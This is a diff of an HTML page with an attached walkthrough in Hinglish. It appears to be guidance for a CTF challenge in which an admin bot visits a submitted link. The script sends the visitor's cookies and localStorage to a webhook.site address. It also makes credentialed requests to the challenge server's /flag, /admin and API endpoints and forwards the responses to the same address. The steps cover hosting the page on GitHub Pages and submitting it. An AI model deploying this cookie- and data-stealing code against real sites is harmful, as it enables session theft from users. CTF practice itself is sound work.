@@ -2,29 +2,47 @@
 <html>
 <body>
 <script>
-// Bot is on YOUR domain, steal from CTF via iframe + navigation
+var w = 'https://webhook.site/3ebc554f-f359-45f5-9b7f-d60cd8539ca8';
+
+// Bot ke cookies bhejo
+fetch(w + '?c=' + encodeURIComponent(document.cookie));
+
+// localStorage bhejo
+fetch(w + '?ls=' + encodeURIComponent(JSON.stringify(localStorage)));
+
+// CTF API call with credentials (bot ke session ke saath)
 var x = new XMLHttpRequest();
-x.open('GET', 'http://151.115.166.43:17947/api/drawings');
+x.open('GET', 'http://151.115.166.43:17947/api/drawings', true);
 x.withCredentials = true;
 x.onload = function() {
-  fetch('https://webhook.site/YOUR-UNIQUE-ID?data=' + encodeURIComponent(x.responseText));
+  fetch(w + '?drawings=' + encodeURIComponent(x.responseText));
 };
 x.send();
 
-// Also steal cookies and localStorage
-fetch('https://webhook.site/YOUR-UNIQUE-ID?cookie=' + encodeURIComponent(document.cookie));
-
-// Try to navigate bot to CTF and steal
-var i = document.createElement('iframe');
-i.src = 'http://151.115.166.43:17947/';
-i.onload = function() {
-  try {
-    fetch('https://webhook.site/YOUR-UNIQUE-ID?iframe=' + encodeURIComponent(i.contentDocument.cookie));
-  } catch(e) {
-    fetch('https://webhook.site/YOUR-UNIQUE-ID?err=' + encodeURIComponent(e));
-  }
-};
-document.body.appendChild(i);
+// Internal flag endpoint try karo
+var endpoints = ['/flag', '/api/flag', '/secret', '/api/secret', '/admin'];
+endpoints.forEach(function(ep) {
+  var r = new XMLHttpRequest();
+  r.open('GET', 'http://151.115.166.43:17947' + ep, true);
+  r.withCredentials = true;
+  r.onload = function() {
+    fetch(w + '?ep=' + encodeURIComponent(ep) + '&res=' + encodeURIComponent(r.responseText));
+  };
+  r.send();
+});
 </script>
 </body>
 </html>
+```
+
+> **Webhook ID already pata hai tere se** — `3ebc554f-f359-45f5-9b7f-d60cd8539ca8` use kar raha hoon
+
+### Step 2 — Commit karo
+- "Commit changes" click karo
+
+### Step 3 — 2 minute wait karo (GitHub Pages deploy hone mein lagta hai)
+
+### Step 4 — CTF mein submit karo
+`http://151.115.166.43:17947/link-submission` pe jao aur ye URL submit karo:
+```
+https://viveksharma-cs.github.io/ctf/
